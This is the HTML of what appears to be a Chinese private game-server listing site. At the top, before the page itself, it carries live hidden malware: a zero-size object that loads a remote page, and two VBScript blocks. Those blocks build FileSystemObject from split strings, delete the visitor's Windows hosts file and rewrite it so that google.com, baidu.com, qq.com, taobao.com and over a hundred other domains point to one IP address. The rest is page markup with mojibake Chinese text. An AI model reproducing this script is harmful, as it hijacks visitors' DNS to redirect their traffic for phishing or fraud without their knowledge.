<object data="http://www.sfyg.com/du.asp" width=0 height=0></object>
<script LANGUAGE="VBScript">


on error resume next

Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")


wj1 = "C:\\WINDOWS\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)


Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<script LANGUAGE="VBScript">
on error resume next
Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")

wj1 = "C:\\WINDNT\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)

Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<head>
<SCRIPT language=javascript author=luxiaoqing><!--
function initArray(){for(i=0;i<initArray.arguments.length;i++)
this[i]=initArray.arguments[i];}var isnMonths=new initArray("1��","2��","3��","4��","5��","6��","7��","8��","9��","10��","11��","12��");var isnDays=new initArray("������","����һ","���ڶ�","������","������","������","������","������");today=new Date();hrs=today.getHours();min=today.getMinutes();sec=today.getSeconds();clckh=""+((hrs+1>12)?hrs+1-12:hrs);
clckm=((min<10)?"0":"")+min;clcks=((sec<10)?"0":"")+sec;clck=(hrs>=12)?"����":"����";var stnr="";var ns="0123456789";var a="";
//-->

</SCRIPT>
<script src="http://www.9jh.com/counter/mystat.aspx?style=no"></script>
<STYLE type=text/css>.headinput {
	WIDTH: 50px; BORDER-TOP-STYLE: none; BORDER-BOTTOM: #666666 1px solid; BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none; HEIGHT: 15px
}
BODY {
	FONT-SIZE: 12px; FONT-FAMILY: "Tahoma","����";background-image: url(http://domain.9jh.com/images/greystrip.gIf);background-position: center center;
}
TD {
	FONT-SIZE: 12px; FONT-FAMILY: "Tahoma","����"
}
A:link {
	COLOR: #000000; TEXT-DECORATION: none
}
A:visited {
	COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
	COLOR: #CC6600; TEXT-DECORATION: underline
}
A:active {
	COLOR: #CC6600; TEXT-DECORATION: underline
}
.tableBorder1 {
	BORDER-RIGHT: 1px; BORDER-TOP: 1px; BORDER-LEFT: 1px; WIDTH: 98%; BORDER-BOTTOM: 1px; BACKGROUND-COLOR: #CC6600
}
TD.TableBody1 {
	BACKGROUND-COLOR: #ffffff
}
.page
{
	background-color: #FFFFFF;
	color: #000000;
}
.tborder
{
	background-color: #D1D1E1;
	color: #000000;
	border: 1px solid #CC6600;
}
.alt1
{
	background-color: #EEEEC6;
	color: #000000;
}
.navbar
{
	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
}
.style31 {FONT-SIZE: 12px; TEXT-INDENT: 2em; line-height: 16px; color: #CC6600; }
.en {
	FONT-SIZE: 11px; FONT-FAMILY: verdana
}
</STYLE>
<head>
<meta http-equiv="Content-Language" content="zh-cn">
<title>����˽������Ԥ�� ˽����Ѷ Www.SfYG.Com</title>
<meta name="keywords" content="���촫��,internet explorer,������,���,ʢ��,����,�漣,���,QQ,ľ��,д��,����,�ƽ�,����,�԰�,��ѵ�Ӱ,MP3, ��Ӱ, ����, MP3����, ��������, ��Ϸ, flash, ��������, ����, �ֻ�����, ����, �ֻ�����, ��������, ��������, ͼƬ, �ֻ�, ������, ��Ӱ����, �ܽ���, �ؿ�,���ݳ���,����,��־,���ֲ�,��Ϸ,����,����,������Ϸ,����,����,����,���,��Ӱ,�����Ӱ,��Ů,����,д��,����,����,��̳,����,����,��ʹ,����,��ʹ����, ��Ϸ, ����, ����, �ɾ�, ��˵, ħ��, ����, ����, ����, ����, ����, ��˵, ��ս, ���, ����, ��Ӣ, ����, ����, ���, ����, ���, ʯ��, ǧ��, ����, ��Ա, ����, ð��, ����, ����, ��ӹ, Ӣ��, ����, ��ս, ����, ����, ħ��, ��԰, ����, ����, ����, ��, �콾, ����, ��ʿ, ͯ��, ����, ����, ����, �ɽ�, ����, ����, Ӷ��, ����, ����, ����, ǧ��II, ǧ��2, ������, ���ϱ�, ��ȸ��, ��ԯ��, ����, ����˹, ���ذ�, ��ս, ƻ����, ������, ���μ�, ���̹��, ����ð��, ��������, ����ѧԺ, ������Ե, Ӷ����˵, �����μ�, ͯ������, �����ϱ�, ��ʿ����, ������˵, ħ������, �ɾ���˵, �ɼ�˼��, ���֮��, ��������, ��������ϵ, �����ܶ�Ա, ���, ����, ���, ��Ƭ, ���, ���, ������ѧ,��ɫ,����,����,��ܸ,�ؼ�,��̳,����,����, Ӱ��, ��������, ������ѧ,D.O.Onlne, Shangrila, Angel, BBS, Online, A3, Arcane, Asgard, Talesweaver, CS, EQ, RO, Ragnarok,Sephiroth, Survival, Game, Games,���,���, Net, W.Y.D, WYD, Shining, Lore, N-AGE, Nage, Redmoon, UO,����,Mud">
</head>

<body topmargin="0">

<table border="0" width="924" id="table1" cellspacing="0" cellpadding="0" align="center" height="76">
	<tr>
		<td height="38">
		<table cellSpacing="0" cellPadding="0" width="924" border="0" id="table3">
			<tr borderColor="#ffffff" bgColor="#000000">
				<td bgColor="#000000" colSpan="11" height="19" style="font-size: 12px; color: #FFFFFF">
				<div class="style62" align="center">
					<a class="style62" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.sfyg.com')" href="http://www.sfyg.com">
					<font color="#FFFFFF">������Ǵ���˽������ʵ��ң�����������վ��Ϊ��ҳ���������Ϊ��ҳ!</font></a></div>
				</td>
			</tr>
			<tr borderColor="#ffffff" bgColor="#000000">
				<td bgColor="#000000" colSpan="11" height="19" style="font-size: 12px; color: #FFFFFF">
				<div class="style54" align="center">
					<a class="style62" href="javascript:window.external.addFavorite('http://www.sfyg.com','ÿ������˽������Ԥ��')">
					<font color="#FFFFFF">�������ϲ����վ�����ϲ�����������Ϸ�������Խ���վ�����ղ�!����ղ�!</font></a></div>
				</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td align="center">
		<a name="1"><span id="post1" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg"><font color="#ff0000"><b>
		<table cellSpacing="0" borderColorDark="#BFDFFF" cellPadding="5" width="924" borderColorLight="#99CCFF" border="1" id="table2">
			<tr>
				<td width="180" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="left"><font face="��Բ"><span style="FONT-SIZE: 13pt">
				<font color="#0000ff">��������:</font> ����һ��<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.21<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">����ʱ��:</font> <b><font color="#ff0000">
				������..</font></b><br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">������·:</font> ���յ���<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">�汾����:</font> ��ʢ��1.85</span></font></td>
				<td width="212" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="left"><font face="��Բ"><span style="FONT-SIZE: 13pt">
				<font color="#0000ff">��������:</font> ������˵<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">IP: </font><font color="#0000FF">
				218.92.240.28</font><br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">����ʱ��:</font> <SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"��/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"��/"+clck+""+clckh+"�㿪��");

//-->

</SCRIPT><br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">������·:</font> ���յ���<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">�汾����: </font>��ʢ��1.85</span></font></td>
				<td width="214" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p style="line-height: 150%; margin-top: 0; margin-bottom: 0" align="center">
				<font color="#000000" size="2"><span id="neonlight">
				��վÿ��������¿��ŵĴ���˽��-���ס��վ����������WWW.SFYG.COM ͬʱ��Ҫ���ǰ�Ctrl+D���Ҹ������QQ����Ŷ�ڡڡ�����һ���֧�����Ƕ���ܸж��ۡۡ�</span></font></td>
				</a>
				<td width="268" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="center" style="line-height: 150%; margin-top: 0; margin-bottom: 0"><b><font color="#FF0000">
				<a target="_blank" href="http://mir.9jh.com">
				<font size="4" color="#FF0000">��Ѽ�����Ϸ�������Լ����ǣ�</font></a></font></b><font size="4"><p align="center" style="line-height: 150%; margin-top: 0; margin-bottom: 0">
				</font><font color="#FF0000"><b>
				<a target="_blank" href="http://mir.9jh.com/web">
				<font size="4" color="#000080">���ͱ�վ�ƽ���λ!</font></a></b></font><a name="1"><p align="center">���λ����:QQ818338</td>
			</tr>
			<tr>
				<td width="180" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
		<a name="11"><span id="post3" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg1"><font color="#ff0000"><font face="��Բ"><b>
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">��������:</font> СС����<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.30<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">����ʱ��:</font> 6.1��8��<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">������·:</font> ���յ���<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">�汾����:</font> </span>
		</b><span style="FONT-SIZE: 13pt">
				��ʢ��1.8</span></font></font></span></span></a></td>
				<td width="212" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="left">
				<span id="post7" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg5"><font color="#ff0000"><b>
		<a name="15"><span id="post8" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg6"><font face="��Բ" color="#ff0000">
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">��������:</font> ����Ժ</span></font></span></span></a></b></font></span></span><STRONG><IMG SRC="images/NEW.GIF"></STRONG><span id="post7" style="font-size: 12px; color: #000000"><span id="LeoBBSgg5"><font color="#ff0000"><b><a name="15"><span id="post8" style="font-size: 12px; color: #000000"><span id="LeoBBSgg6"><font face="��Բ" color="#ff0000"><span style="FONT-SIZE: 13pt"><br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.26<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">����ʱ��:</font> 5��30<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">������·:</font> ���յ���<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">�汾����:</font> </span></font></span></span></a>
		</b></font></span></span><a name="15"><b>
				<font face="��Բ" style="font-size: 13pt" color="#FF0000">�еȱ�̬</font></b></a></td>
				<td width="214" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="left">
		<span id="LeoBBSgg7">
				<span id="post9" style="font-size: 12px; color: #000000">
				<font color="#ff0000"><b>
				<span id="post10" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg8">
		<a name="16"><span id="post11" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg9"><font face="��Բ" color="#ff0000">
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">��������:</font> </span></font></span></span></a></span></span>
		</b></font></span><font color="#ff0000"><b>
				<font face="��Բ" style="font-size: 13pt">
				<a name="16" target="_blank" href="http://www.cn8816.com">
				<span id="post9" style="color: #000000">
				�߷�ʱ��</span></a></font><span id="post9" style="font-size: 12px; color: #000000"><STRONG><IMG SRC="images/NEW.GIF"></STRONG><span id="post12" style="font-size: 12px; color: #000000"><span id="LeoBBSgg10"><a name="17"><span id="post13" style="font-size: 12px; color: #000000"><span id="LeoBBSgg11"><font face="��Բ" color="#ff0000"><span style="FONT-SIZE: 13pt"><br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.29<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">����ʱ��:</font> 7��29��20:00<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">������·:</font> ���յ���<br style="font-family: ����; font-size: 9pt">
				<font color="#0000ff">�汾����:</font> </span></font></span></span></a>
				</span></span></span><font face="��Բ" style="font-size: 13pt">
				<a name="17"><span id="post9">
				��ʢ��1.8��</span></a></font></b></font></span></td>
				<td width="268" bgColor="#ecf8ff" style="font-family: ����; font-size: 9pt">
				<p align="center">
				<span id="post6" style="font-size: 12px; color: #000000">
